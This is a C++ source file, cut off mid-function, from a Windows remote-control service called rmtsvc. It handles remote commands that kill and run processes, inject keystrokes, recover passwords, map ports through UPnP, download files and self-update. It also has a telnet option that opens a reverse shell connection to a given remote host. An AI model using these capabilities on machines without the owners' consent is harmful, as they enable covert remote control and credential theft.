/*******************************************************************
   *	shellCommandEx.cpp 
   *    DESCRIPTION: CMD Shell扩展命令处理
   *
   *    AUTHOR:yyc
   *
   *    HISTORY:
   *
   *	
   *******************************************************************/
#include "rmtsvc.h" 
#include "other/Wutils.h"
#include "shellCommandEx.h"
#include <io.h> //for _access(...
#include "net4cpp21/utils/cCmdShell.h"
const char *STR_REUSEDPORT="REUSED_PORT";
std::string g_savepath;

//解析处理扩展命令
BOOL doCommandEx(const char *strCmd,const char *strParam,std::string &strRet)
{
	BOOL bRet=FALSE;
	if(strcasecmp(strCmd,"path")==0)
		bRet=setSavePath(strParam,strRet);
	else if(strcasecmp(strCmd,"cmd")==0)//设置cmd路径
		bRet=SetCmdPath(strParam,strRet);	
	else if(strcasecmp(strCmd,"kill")==0) //杀死指定的进程
		bRet=docmd_kill(strParam);
	else if(strcasecmp(strCmd,"exec")==0) //执行指定的程序
		bRet=docmd_exec(strParam);
	else if(strcasecmp(strCmd,"stat")==0)
		bRet=sysStatus(strRet);
	else if(strcasecmp(strCmd,"plst")==0)
		bRet=listProcess(strParam,strRet);
	else if(strcasecmp(strCmd,"fport")==0)
		bRet=portList(strRet);
	else if(strcasecmp(strCmd,"import")==0)
		bRet=ImportSetting(strParam,strRet);
	else if(strcasecmp(strCmd,"export")==0)
		bRet=ExportSetting(strRet);
	else if(strcasecmp(strCmd,"shutdown")==0)
		bRet=Wutils::ShutDown();
	else if(strcasecmp(strCmd,"restart")==0)
		bRet=Wutils::Restart();
	else if(strcasecmp(strCmd,"logoff")==0)
		bRet=Wutils::Logoff();
	else if(strcasecmp(strCmd,"lock")==0)
		bRet=Wutils::LockWorkstation();
	else if(strcasecmp(strCmd,"mtcpr")==0) 
		bRet=docmd_mtcpr(strParam,strRet);
	else if(strcasecmp(strCmd,"ftp")==0)
		bRet=docmd_ftpsvc(strParam,strRet);
	else if(strcasecmp(strCmd,"proxy")==0)
		bRet=docmd_proxysvc(strParam,strRet);
	else if(strcasecmp(strCmd,"vidcs")==0)
		bRet=docmd_vidcs(strParam,strRet);
	else if(strcasecmp(strCmd,"www")==0)
		bRet=docmd_websvc(strParam,strRet,NULL,"");
	else if(strcasecmp(strCmd,"telnet")==0) //开启telnet
		bRet=docmd_telnet(strParam,strRet);
	else if(strcasecmp(strCmd,"fpas")==0)
	{
		bRet=Wutils::FindPassword(strParam);
		strRet.append(Wutils::getLastInfo()); strRet.append("\r\n");
	}
	else if(strcasecmp(strCmd,"upnp")==0)
	{
		const char *ptr=(strParam)?strchr(strParam,' '):NULL;
		if(ptr){
			*(char *)ptr=0; strCmd=strParam; strParam=ptr+1;
		}else{ strCmd=strParam; strParam=NULL; }
		bRet=upnp_cmd(strCmd,strParam,strRet);
	}else if(strcasecmp(strCmd,"keys")==0) //模拟按键或字符串输入
	{
		if(strParam) //yyc modify 2008-03-25支持按键的mime编码
			cCoder::mime_decode(strParam,strlen(strParam),(char *)strParam);
		bRet=Wutils::sendKeys(strParam);
	}
	else if(strcasecmp(strCmd,"3key")==0)
	{
		if( !(bRet=Wutils::SimulateCtrlAltDel()) ) strRet.append(Wutils::getLastInfo());
	}
	else if(strcasecmp(strCmd,"help")==0)
		strRet.append("See usage manual\r\n");
	else strRet.append("unknowed command.\r\n");
	return bRet;
}
//设置接收文件的保存路径 
BOOL setSavePath(const char *spath,std::string &strRet)
{
	char buf[MAX_PATH]; int slen;
	if(spath && spath[0]!=0) //设置存储路径
	{
		if(strcmp(spath,".")==0)
		{
			DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH-1); buf[dwret]=0;
			char *ptr=strrchr(buf,'\\');
			if(ptr==NULL) g_savepath="";
			else g_savepath.assign(buf,ptr-buf+1);
		}else if( _access(spath,0)==-1)
		{
			slen=sprintf(buf,"invalid path %s.\r\n",spath);
			strRet.append(buf); return FALSE;
		}else{
			g_savepath.assign(spath);
			if(g_savepath[g_savepath.length()-1]!='\\') g_savepath.append("\\");
		}
	}
	slen=sprintf(buf,"current saving path is %s!\r\n",g_savepath.c_str());
	strRet.append(buf); return TRUE;
}
//设置cmd.exe的路径
BOOL SetCmdPath(const char *spath,std::string &strRet)
{
	char buf[MAX_PATH]; int slen;
	if(spath && spath[0]!=0) //设置cmd.exe路径
	{
		if( _access(spath,0)==-1)
		{
			slen=sprintf(buf,"invalid cmd path %s.\r\n",spath);
			strRet.append(buf); return FALSE;
		}else
			cCmdShell::staCmdPath.assign(spath);
	}
	slen=sprintf(buf,"cmd path is %s!\r\n",cCmdShell::staCmdPath.c_str());
	strRet.append(buf); return TRUE;
}
//获取系统的状态信息
BOOL sysStatus(std::string &strRet)
{
	char buf[MAX_PATH];
	int buflen=sprintf(buf,"compute name: %s\r\n",Wutils::computeName());
	strRet.append(buf,buflen);
	MSOSTYPE ost=Wutils::winOsType();
	buflen=sprintf(buf,"%s\r\n",Wutils::getLastInfo());
	strRet.append(buf,buflen);
	Wutils::cpuInfo(ost);
	buflen=sprintf(buf,"cpu: %s\r\n",Wutils::getLastInfo());
	strRet.append(buf,buflen);
	MSOSSTATUS oss=Wutils::winOsStatus();
	buflen=sprintf(buf,"%s\r\n",Wutils::getLastInfo());
	strRet.append(buf,buflen);
	MyService *ptrService=MyService::GetService();
	/* //yyc remove MSN 2010-11-05
	if(ptrService){
		buflen=sprintf(buf,"clientIP: %s , %s\r\n",ptrService->m_msnbot.clientIP(),
			(!ptrService->m_msnbot.Connectivity())?"behind NAT":"" );
		strRet.append(buf,buflen);
	} */ //yyc remove MSN 2010-11-05
	strRet.append("\r\n",2);

	DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH);
	buf[dwret]=0;
	if(ptrService && ptrService->GetServiceConfig(NULL))
		buflen=sprintf(buf,"%s\r\nVersion: %s\r\nServer name: %s\r\n",buf,MyService::ServiceVers,ptrService->GetServiceName());
	else buflen=sprintf(buf,"%s\r\nVersion: %s\r\nServer name: Not install service\r\n",buf,MyService::ServiceVers);
	strRet.append(buf,buflen);
	return TRUE;
}

//支持*?通配符号
BOOL listProcess(const char *filter,std::string &strRet)
{
	std::vector<std::pair<DWORD,std::string> > vecList;
	if(Wutils::procList(vecList,filter)==0)
	{
		strRet.append("Failed to list process!\r\n");
		return FALSE;
	}
	
	char s[256]; int slen;
	slen=sprintf(s,"plst - total %d process, filter: %s\r\n",vecList.size(),((filter)?filter:"") );
	strRet.append(s); strRet.append("id\tPID\tname\r\n");
	for(int i=0;i<vecList.size();i++)
	{
		slen=sprintf(s,"%d\t%u\t%s\r\n",i+1,vecList[i].first,vecList[i].second.c_str());
		strRet.append(s);
	}
	return TRUE;
}
void GetBindIPAddr(std::string &bindip,const char *strParam)
{
	if(strParam==NULL) return;
	const char *p=strstr(strParam," bindip=");
	if(p){ //指定了启动服务要绑定的IP
			p+=8; while(*p==' ') p++; //指向绑定的IP，并去掉空格
			if(*p==0) p=socketBase::getLocalHostIP(); //没有指定IP,自动获取本机第一个IP
			if(p) bindip.assign(p); else bindip="";
		}else bindip="";
	return;
}

BOOL docmd_telnet(const char *strParam,std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	telServerEx *psvc=&ptrService->m_telsvr;
	BOOL bRet=TRUE; char s[256];
	if(strParam && strcasecmp(strParam,"stop")==0)
		psvc->Stop(); //停止tel远程访问服务
	else if(strParam && strncasecmp(strParam,"start",5)==0 
		   && psvc->status()!=SOCKS_LISTEN )
	{//启动Telnet远程访问服务
		const char *p=strParam+5; while(*p==' ') p++;
		if(*p>='0' && *p<='9'){ psvc->m_svrport=atoi(p); p=strchr(p,' ');}
		psvc->docmd_sets(p); //获取绑定帐号信息
		GetBindIPAddr(psvc->m_bindip,p);
		if(psvc->m_svrport==0) psvc->m_svrport=23; //设成默认Telnet端口
		bRet=(psvc->Start())?TRUE:FALSE;
	}
	else if(strParam && strncasecmp(strParam,"iprules ",8)==0)
		psvc->docmd_iprules(strParam+8); 
	else if(strParam && strncasecmp(strParam,"-r ",3)==0) //反向telnet连接
	{
		const char *p=strParam+3; while(*p==' ') p++;
		int iport=0;  //获取反向连接的host
		const char *pos=strchr(p,':');
		if(pos){ iport=atoi(pos+1); *(char *)pos=0; }
		SOCKSRESULT sr=psvc->revConnect(p,iport,-1);
		if(sr>0)
			sprintf(s,"Success to connect %s:%d\r\n",p,iport);
		else sprintf(s,"Failed to connect %s:%d, error=%d\r\n",p,iport,sr); 
		strRet.append(s);  if(pos) *(char *)pos=':';
		return (sr>0)?TRUE:FALSE;
	}

	if(psvc->status()==SOCKS_LISTEN)
	{
		sprintf(s,"Telnet Service has been started at %s:%d %s\r\n",psvc->getLocalIP(),psvc->getLocalPort(),
				((psvc->GetReuseAddr()==SO_REUSEADDR)?STR_REUSEDPORT:""));
	}
	else sprintf(s,"Telnet Service has been stopped at %s:%d\r\n",psvc->m_bindip.c_str(),psvc->m_svrport);
	strRet.append(s);
	if(psvc->bTelAuthentication()){
		sprintf(s,"No anonymous access , Account - %s:%s\r\n", psvc->getTelAccount(),psvc->getTelPassword());
		strRet.append(s);
	}
	iprules &iprs=psvc->rules();
	int len,c=iprs.rules();
	sprintf(s,"\r\n    IP                Mask              Port        \r\n"); strRet.append(s);
	for(int i=0;i<c;i++)
	{
		IPRule &ipr=iprs.rules(i);
		len=sprintf(s,"%02d  ",i+1);
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPAddr_src));
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPMask_src));
		len+=sprintf(s+len,"%d  %s\r\n",ipr.port_src,((ipr.bEnabled)?"ENABLED":"DISABLED") );
		strRet.append(s);
	}
	sprintf(s,"******Total %d IP Rule******\r\n",c); strRet.append(s);
	return bRet;
}

//启动或停止rmtsvc远程控制管理服务
BOOL docmd_websvc(const char *strParam,std::string &strRet,const char *strIP,const char *urlparam)
{
	MyService *ptrService=MyService::GetService();
	webServer *pwwwSvc=&ptrService->m_websvr;//指向www服务的指针
	BOOL bRet=TRUE;
	if(strParam && strcasecmp(strParam,"stop")==0)
		pwwwSvc->Stop(); //停止web远程访问服务
	else if(strParam && strncasecmp(strParam,"start",5)==0 
		   && pwwwSvc->status()!=SOCKS_LISTEN )
	{//启动web远程访问服务
		const char *p=strParam+5; while(*p==' ') p++;
		if(*p>='0' && *p<='9'){ pwwwSvc->m_svrport=atoi(p); p=strchr(p,' ');}
		GetBindIPAddr(pwwwSvc->m_bindip,p);
		if(pwwwSvc->m_svrport==0) pwwwSvc->m_svrport=-1; //设成以随机端口启动服务
		bRet=(pwwwSvc->Start())?TRUE:FALSE;
	}
	else if(strParam && strncasecmp(strParam,"iprules ",8)==0)
		pwwwSvc->docmd_webiprules(strParam+8); 

	char s[128];//返回web远程访问服务的状态
	if(pwwwSvc->status()==SOCKS_LISTEN)
	{
		sprintf(s,"Remote Service has been started at %s:%d %s\r\n",pwwwSvc->getLocalIP(),pwwwSvc->getLocalPort(),
				((pwwwSvc->GetReuseAddr()==SO_REUSEADDR)?STR_REUSEDPORT:""));
		if(strIP){ 
			strRet.append(s);
			sprintf(s,"http%s://%s:%d/login?%s\r\n",(pwwwSvc->ifSSL()?"s":""),strIP,pwwwSvc->getLocalPort(),urlparam);
		}
	}
	else sprintf(s,"Remote Service has been stopped at %s:%d\r\n",pwwwSvc->m_bindip.c_str(),pwwwSvc->m_svrport);
	strRet.append(s);

	iprules &iprs=pwwwSvc->rules();
	int len,c=iprs.rules();
	sprintf(s,"\r\n    IP                Mask              Port        \r\n"); strRet.append(s);
	for(int i=0;i<c;i++)
	{
		IPRule &ipr=iprs.rules(i);
		len=sprintf(s,"%02d  ",i+1);
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPAddr_src));
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPMask_src));
		len+=sprintf(s+len,"%d  %s\r\n",ipr.port_src,((ipr.bEnabled)?"ENABLED":"DISABLED") );
		strRet.append(s);
	}
	sprintf(s,"******Total %d IP Rule******\r\n",c); strRet.append(s);
	return bRet;
}
//启动或停止FTP服务
BOOL docmd_ftpsvc(const char *strParam,std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	ftpsvrEx *pftp=&ptrService->m_ftpsvr;
	BOOL bRet=TRUE;
	if(strParam && strcasecmp(strParam,"stop")==0)
		pftp->Stop();  //停止FTP服务
	else if(strParam && strncasecmp(strParam,"start",5)==0 
		   && pftp->status()!=SOCKS_LISTEN )
	{//启动FTP服务
		const char *p=strParam+5; while(*p==' ') p++;
		if(*p>='0' && *p<='9'){ pftp->m_settings.svrport=atoi(p); p=strchr(p,' ');}
		GetBindIPAddr(pftp->m_settings.bindip,p);
		pftp->Start(); //启动ftp服务
	}
	else if(strParam && strncasecmp(strParam,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strParam+8,' ',maps)>0)
		{
			std::map<std::string,std::string>::iterator it;
			int ipaccess=1; std::string ipRules;
			if( (it=maps.find("access"))!=maps.end())
				ipaccess=atoi((*it).second.c_str());
			if( (it=maps.find("ipaddr"))!=maps.end()) ipRules=(*it).second;
			//设置IP过滤规则
			if(ipRules=="")
				pftp->rules().addRules_new(RULETYPE_TCP,1,NULL);
			else  pftp->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
		}
	}

	char s[128]; //返回FTP服务的状态
	if(pftp->status()==SOCKS_LISTEN)
		sprintf(s,"FTP Service %s has been started at %s:%d %s\r\n",((pftp->ifSSL())?"(SSL)":""),
			pftp->getLocalIP(),pftp->getLocalPort(),((pftp->GetReuseAddr()==SO_REUSEADDR)?STR_REUSEDPORT:"") );
	else sprintf(s,"FTP Service has been stopped at %s:%d\r\n",pftp->m_settings.bindip.c_str(),pftp->m_settings.svrport);
	strRet.append(s);

	iprules &iprs=pftp->rules();
	int len,c=iprs.rules();
	sprintf(s,"\r\n    IP                Mask              Port        \r\n"); strRet.append(s);
	for(int i=0;i<c;i++)
	{
		IPRule &ipr=iprs.rules(i);
		len=sprintf(s,"%02d  ",i+1);
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPAddr_src));
		len+=sprintf(s+len,"%s  ",socketBase::IP2A(ipr.IPMask_src));
		len+=sprintf(s+len,"%d  %s\r\n",ipr.port_src,((ipr.bEnabled)?"ENABLED":"DISABLED") );
		strRet.append(s);
	}
	sprintf(s,"******Total %d IP Rule******\r\n",c); strRet.append(s);
	return bRet;
}
//启动或停止Proxy服务
BOOL docmd_proxysvc(const char *strParam,std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	proxysvrEx *psvr=&ptrService->m_proxysvr;
	BOOL bRet=TRUE;
	if(strParam && strcasecmp(strParam,"stop")==0)
		psvr->Stop(); //停止服务
	else if(strParam && strncasecmp(strParam,"start",5)==0 
		   && psvr->status()!=SOCKS_LISTEN )
	{//启动服务
		const char *p=strParam+5; while(*p==' ') p++;
		if(*p>='0' && *p<='9'){ psvr->m_settings.svrport=atoi(p); p=strchr(p,' ');}
		GetBindIPAddr(psvr->m_settings.bindip,p);
		psvr->Start(); //启动服务
	}
	else if(strParam && strncasecmp(strParam,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strParam+8,' ',maps)>0)
		{
			std::map<std::string,std::string>::iterator it;
			int ipaccess=1; std::string ipRules;
			if( (it=maps.find("access"))!=maps.end())
				ipaccess=atoi((*it).second.c_str());
			if( (it=maps.find("ipaddr"))!=maps.end()) ipRules=(*it).second;
			//设置IP过滤规则
			if(ipRules=="")
				psvr->rules().addRules_new(RULETYPE_TCP,1,NULL);
			else  psvr->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
		}
	}

	char s[128]; //返回服务的状态
	if(psvr->status()==SOCKS_LISTEN)
		sprintf(s,"Proxy Service has been started at %s:%d %s\r\n",psvr->getLocalIP(),
		psvr->getLocalPort(),((psvr->GetReuseAddr()==SO_REUSEADDR)?STR_REUSEDPORT:"") );
	else sprintf(s,"Proxy Service has been stopped at %s:%d\r\n",psvr->m_settings.bindip.c_str(),psvr->m_settings.svrport);
	strRet.append(s);
	
	sprintf(s,"iprules access=%d ipaddr=",psvr->m_settings.ipaccess);
	strRet.append(s); strRet.append(psvr->m_settings.ipRules);
	strRet.append("\r\n"); return bRet;
}

//启动或停止vIDCs服务
BOOL docmd_vidcs(const char *strParam,std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	vidcManager *pvidc=&ptrService->m_vidcManager;
	vidcServerEx &vidcsvr=pvidc->m_vidcsvr;
	BOOL bRet=TRUE;
	if(strParam && strcasecmp(strParam,"stop")==0)
		vidcsvr.Stop(); //停止vIDCs服务
	else if(strParam && strncasecmp(strParam,"start",5)==0 
		   && vidcsvr.status()!=SOCKS_LISTEN )
	{//启动vIDCs服务
		const char *p=strParam+5; while(*p==' ') p++;
		if(*p>='0' && *p<='9'){ vidcsvr.m_svrport=atoi(p); p=strchr(p,' ');}
		GetBindIPAddr(vidcsvr.m_bindip,p);
		vidcsvr.Start(); //启动vIdcs服务
	}
	else if(strParam && strncasecmp(strParam,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strParam+8,' ',maps)>0)
		{
			std::map<std::string,std::string>::iterator it;
			vidcsvr.m_ipaccess=1;
			if( (it=maps.find("access"))!=maps.end())
				vidcsvr.m_ipaccess=atoi((*it).second.c_str());
			if( (it=maps.find("ipaddr"))!=maps.end())
				vidcsvr.m_ipRules=(*it).second;
			else vidcsvr.m_ipRules="";
			if(vidcsvr.m_ipRules=="") vidcsvr.m_ipaccess=1;
			//设置IP过滤规则
			vidcsvr.rules().addRules_new(RULETYPE_TCP,vidcsvr.m_ipaccess,vidcsvr.m_ipRules.c_str());
		}
	}

	char s[128]; //返回vIDCs服务的状态
	if(vidcsvr.status()==SOCKS_LISTEN)
		sprintf(s,"vIDCs Service has been started at %s:%d %s\r\n",vidcsvr.getLocalIP(),vidcsvr.getLocalPort(),
				((vidcsvr.GetReuseAddr()==SO_REUSEADDR)?STR_REUSEDPORT:""));
	else sprintf(s,"vIDCs Service has been stopped at %s:%d\r\n",vidcsvr.m_bindip.c_str(),vidcsvr.m_svrport);
	strRet.append(s);
	sprintf(s,"iprules access=%d ipaddr=",vidcsvr.m_ipaccess);
	strRet.append(s); strRet.append(vidcsvr.m_ipRules);
	strRet.append("\r\n"); return bRet;
}

//远程端口映射，格式:
//mtcpr vidcs=<host:port@pswd> appsvr=<appsvr:appport> mport=<映射端口>[+-ssl]
BOOL docmd_mtcpr(const char *strParam,std::string &strRet)
{
	char buf[256]; const char *ptr,*ptr_vname;
	MyService *ptrService=MyService::GetService();
	vidcManager *pvidcM=&ptrService->m_vidcManager;
	vidcClient *pvidcc=NULL;
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("appsvr"))==maps.end() || (*it).second=="" )
	{
		strRet.append("Error param: no appsvr info\r\n");
		return FALSE;
	}
	if( (it=maps.find("vidcs"))!=maps.end())
	{
		std::string vidcs_host,vidcs_pswd;
		std::string &vname=(*it).second;
		if( (ptr=strchr(vname.c_str(),'@')) )
		{
			vidcs_host.assign(vname.c_str(),ptr-vname.c_str());
			vidcs_pswd.assign(ptr+1);
		}else vidcs_host=vname;
		if(vname.length()>64) return FALSE; //保护缓冲区
		sprintf(buf,"vname=%s vhost=%s vpswd=%s autorun=0",vname.c_str(),vidcs_host.c_str(),vidcs_pswd.c_str());
		//添加或修改一个vidcc连接客户连接指定的vidcs
		pvidcM->docmd_vidcc(buf);
		pvidcc=pvidcM->m_vidccSets.GetVidcClient(vname.c_str(),false);
		if(pvidcc==NULL){
			strRet.append("Error param: wrong vidcs info\r\n");
			return FALSE;
		}
		else if(pvidcc->status()!=SOCKS_CONNECTED)
		{
			SOCKSRESULT sr=pvidcc->ConnectSvr();
			if(sr<=0){
				strRet.append("failed to connect vidcs");
				if(sr==SOCKSERR_VIDC_PSWD) strRet.append(": wrong password\r\n");
				else if(sr==SOCKSERR_VIDC_PSWD) strRet.append(": wrong version\r\n");
				else if(sr==SOCKSERR_VIDC_RESP) strRet.append(": timeout\r\n");
				else strRet.append("\r\n");
				return FALSE;
			}
		}
		ptr_vname=vname.c_str();
	}else{
		strRet.append("Error param: no vidcs info\r\n");
		return FALSE;
	}
	it=maps.find("appsvr");
	std::string &appsvr=(*it).second;
	const char *ptr_name=appsvr.c_str();
	if( (it=maps.find("name"))!=maps.end()) ptr_name=(*it).second.c_str();
	int buflen=sprintf(buf,"vname=%s name=%s appsvr=%s ",ptr_vname,ptr_name,appsvr.c_str());
	it=maps.begin();
	for(;it!=maps.end();it++)
	{
		if((*it).first!="vidcs" && (*it).first!="name" && (*it).first!="appsvr")
		{ //去除已经处理过的
			if( ((*it).first.length()+(*it).second.length()+2)>=(256-buflen)) break; //缓冲区保护
			buflen+=sprintf(buf+buflen,"%s=%s ",(*it).first.c_str(),(*it).second.c_str());
		}
	}
	pvidcM->docmd_mtcpr(buf);
	mapInfo * pinfo=pvidcc->mapinfoGet(ptr_name,false);
	if(pinfo==NULL)
	{
		strRet.append("Error param: wrong mtcpr info\r\n");
		return FALSE;
	}
	int mapport=pvidcc->Mapped(ptr_name,pinfo);
	if(mapport<=0){
		sprintf(buf,"Failed to mtcpr,error=%d\r\n",mapport);
		strRet.append(buf); return FALSE;
	}
	sprintf(buf,"Success to mtcpr,mapped=%d\r\n",mapport);
	strRet.append(buf); return TRUE;
}

//--------------------UPnP 相关处理------------------------------------------------
BOOL upnp_cmd(const char *strCmd,const char *strParam,std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	vidcManager *pvidc=&ptrService->m_vidcManager;
	upnp &u=pvidc->m_upnp;
	if(strCmd && strcasecmp(strCmd,"find")==0)
	{	u.Search(); Sleep(2000); }
	else if(strCmd && strcasecmp(strCmd,"stop")==0)
		u.Close();
	else if(strCmd && strcasecmp(strCmd,"add")==0) //添加UPnP映射
	{//格式 : upnp add type=[TCP|UDP] appsvr=<应用服务> mport=<外网端口> appdesc=<描述>"
		if(strParam) pvidc->docmd_upnp(strParam);
	}
	else if(strCmd && strcasecmp(strCmd,"delete")==0) //删除UPnP映射
	{//格式 : upnp delete <外网端口> <TCP|UDP>
		if(strParam){
			while(*strParam==' ') strParam++; //去掉空格
			int wport=atoi(strParam);
			const char *ptr=strchr(strParam,' ');
			if(ptr) while(*ptr==' ') ptr++; //去掉空格
			bool btcp=(ptr && strcasecmp(ptr,"UDP")==0)?false:true;
			u.DeletePortMapping(btcp,wport);
		}//?if(strParam)
	}
	
	char s[256]; int slen;
	if(!u.bFound()){
		if(u.status()==SOCKS_OPENED)
			 strRet.append("Not Find UPnP Device, is finding...\r\n");
		else strRet.append("Not Find UPnP Device\r\n");
	}else{
		std::string strIP; u.GetWanIP(strIP);
		slen=sprintf(s,"Internet IP: %s\r\n",strIP.c_str()); strRet.append(s);
		slen=sprintf(s,"friendlyName: %s\r\n",u.name()); strRet.append(s);
		slen=sprintf(s,"manufacturer: %s\r\n",u.manufacturer()); strRet.append(s);
	}
	strRet.append("----UPnP list----\r\nType\tWAN-Port\tLAN-Port\tLAN-IP\tstatus\tdesc\r\n");

	std::vector<UPnPInfo *> &upnpsets=u.upnpinfo();
	std::vector<UPnPInfo *> ::iterator it_upnpsets=upnpsets.begin();
	for(;it_upnpsets!=upnpsets.end();it_upnpsets++){
		UPnPInfo *p=*it_upnpsets;
		slen=sprintf(s,"%s\t%d\t%d\t%s\t%s\t",((p->budp)?"UDP":"TCP"),p->mapport,p->appport,p->appsvr.c_str(),((p->bsuccess)?"success":"fail")); 
		strRet.append(s); strRet+=p->appdesc;
	}
	return TRUE;
}
//-------------------------------------------------------------------------------------
extern bool writeParamintofile(const char *strexefile,const char *param,long paramlen);
extern bool readParamfromfile(std::string &strret,const char *strexefile);

//导出配置参数
BOOL ExportSetting(std::string &strRet)
{
	MyService *ptrService=MyService::GetService();
	//导出vidc的配置参数
	strRet.append("!========vidc settings========\r\n");	
	vidcManager *pvidc=&ptrService->m_vidcManager;
	pvidc->saveAsstring(strRet);
	//导出proxy的配置参数
	strRet.append("\r\n!========Proxy settings========\r\n");
	proxysvrEx *psvr=&ptrService->m_proxysvr;
	psvr->saveAsstring(strRet);
	//导出ftp的配置参数
	strRet.append("\r\n!========FTP settings========\r\n");
	ftpsvrEx *pftp=&ptrService->m_ftpsvr;
	pftp->saveAsstring(strRet);	
	
	//导出exe的配置参数
	strRet.append("\r\n!========EXE settings========\r\n");
	readParamfromfile(strRet,NULL);
	return TRUE;
}
//导入配置参数并写入注册表
//格式: import [ftp|proxy|vidc]<[filename]
BOOL ImportSetting(const char *strParam,std::string &strRet)
{
	if(strParam)
	{
		while(*strParam==' ') strParam++;
		const char *filename=strchr(strParam,'<');
		if(filename)
		{
			*(char *)filename++=0;
			while(*filename==' ') filename++;
			FILE *fp=::fopen(filename,"rb");
			if(fp)
			{
				::fseek(fp,0,SEEK_END);
				long filelen=::ftell(fp);
				char *buf=(filelen<=0 || filelen>20480)?NULL:(new char[filelen+1]);
				if(buf)
				{
					::fseek(fp,0,SEEK_SET);
					filelen=::fread(buf,sizeof(char),filelen,fp);
					buf[filelen]=0; ::fclose(fp); fp=NULL;
					if(strcasecmp(strParam,"ftp")==0)
					{//读入FTP服务的配置，并写入注册表
						MyService *ptrService=MyService::GetService();
						ftpsvrEx *pftpsvr=&ptrService->m_ftpsvr;
						pftpsvr->initSetting();
						pftpsvr->m_userlist.clear();
						pftpsvr->parseIni(buf,filelen);
						pftpsvr->saveIni();
						delete[] buf; return TRUE;
					}
					else if(strcasecmp(strParam,"proxy")==0)
					{//读入Proxy服务的配置，并写入注册表
						MyService *ptrService=MyService::GetService();
						proxysvrEx *psvr=&ptrService->m_proxysvr;
						psvr->initSetting();
						psvr->m_userlist.clear();
						psvr->parseIni(buf,filelen);
						psvr->saveIni();
						delete[] buf; return TRUE;
					}
					else if(strcasecmp(strParam,"vidc")==0)
					{//读入vidc服务的配置，并写入注册表
						MyService *ptrService=MyService::GetService();
						vidcManager *pvidc=&ptrService->m_vidcManager;
						pvidc->initSetting();
						pvidc->parseIni(buf,filelen);
						pvidc->saveIni(); //保存vidc配置参数
						delete[] buf; return TRUE;
					}
					delete[] buf;
				}//?if(buf)
				if(fp) ::fclose(fp);
			}//?if(fp)
		}//?if(filename)
	}//?if(strParam)
	strRet.append("unknowed command/wrong param.\r\n");
	return FALSE;
}

//自动升级rmtsvc
BOOL updateRV(const char *strParam,std::string &strRet)
{
	const char *strUpdatefile=strParam;
	//检测本地升级文件是否存在
	if(strUpdatefile==NULL || _access(strUpdatefile,0)==-1)
	{
		strRet.append("\r\nNot find update file!\r\n");
		return FALSE;
	}
	//检测是否更新新的exe配置参数
	//如果新的exe已经配置了参数，则启用新exe里的参数，否则如果被更新的exe里写入了参数
	//则将被更新exe里的参数写入到新的exe中
	std::string strini;
	if(!readParamfromfile(strini,strUpdatefile))
	{//新的exe没有配置参数
        strini="";//判断被更新的exe有没有配置参数
		if(readParamfromfile(strini,NULL)) //读取原exe配置参数
		{
			//将配置参数写入新的exe中
			writeParamintofile(strUpdatefile,strini.c_str(),strini.length());
		}//?if(readParamfromfile
	}//?if(!readParamfromfile
	//将原exe文件改名
	char srcname[MAX_PATH];//获取本程序的路径和名称
	::GetModuleFileName(NULL,srcname,MAX_PATH-1);
	std::string tmpname(srcname); tmpname.append(".tmp");
	if(::MoveFile(srcname,tmpname.c_str()))
	{
		if(::MoveFile(strUpdatefile,srcname)){
			DWORD pid=::GetCurrentProcessId(); // 杀调当前进程
			HANDLE hProcess=::OpenProcess(PROCESS_ALL_ACCESS,TRUE,pid);
			if(hProcess) ::TerminateProcess(hProcess,0);
			::CloseHandle(hProcess); return TRUE;
		}
	}
	::DeleteFile(tmpname.c_str());
	::DeleteFile(strUpdatefile);
	strRet.append("\r\nFailed to update!\r\n");
	return FALSE;
}

#include "net4cpp21/include/httpclnt.h"
BOOL downfile_http(const char *httpurl,const char *strSaveas,clsOutput &sout)
{
	char s[128]; int slen;
	MyService *psvr=MyService::GetService();
	socketBase *pevent=(psvr)?psvr->GetSockEvent():NULL;
	httpClient httpc; httpc.setParent(pevent);
	SOCKSRESULT sr=httpc.send_httpreq(httpurl);
	while(sr==302){//转向
		std::map<std::string,std::string> &rspheader=httpc.Response().Header();
		std::string newUrl=rspheader["Location"];
		httpc.cls_httpreq(); httpurl=newUrl.c_str();
		sr=httpc.send_httpreq(httpurl);
	}//?while(sr==302
	if(sr!=200){ sout.print("Failed to access url!\r\n",0); return FALSE; }

	long lsize=httpc.rspContentLen();
	if(lsize==-1)
		slen=sprintf(s,"success to access,file size=unknowed\r\n");
	else if(lsize<10240)
		slen=sprintf(s,"success to access,file size=%d Bytes\r\n",lsize);
	else slen=sprintf(s,"success to access,file size=%d KBytes\r\n",lsize/1024);
	sout.print(s,slen);
	
	FILE *fp=::fopen(strSaveas,"wb");
	if(fp==NULL){ sout.print("Failed to open file for writing!\r\n",0); return FALSE; }

	char buf[4096]; unsigned long recvBytes=0;
	long iPercent,iPrePercent=-1;
	httpResponse &httprsp=httpc.Response();
	if(httprsp.lReceivedContent()>0)
	{
		::fwrite(httprsp.szReceivedContent(),sizeof(char),httprsp.lReceivedContent(),fp);
		recvBytes+=httprsp.lReceivedContent();
	}
	while(recvBytes<(unsigned long)lsize)
	{
		int iret=httpc.checkSocket(SCHECKTIMEOUT,SOCKS_OP_READ);
		if(iret<0) break; 
		if(iret==0) continue;
		iret=httpc.Receive(buf,4096,-1);
		if(iret<0) break; recvBytes+=iret;
		::fwrite(buf,sizeof(char),iret,fp);
		iPercent=recvBytes*100/lsize;
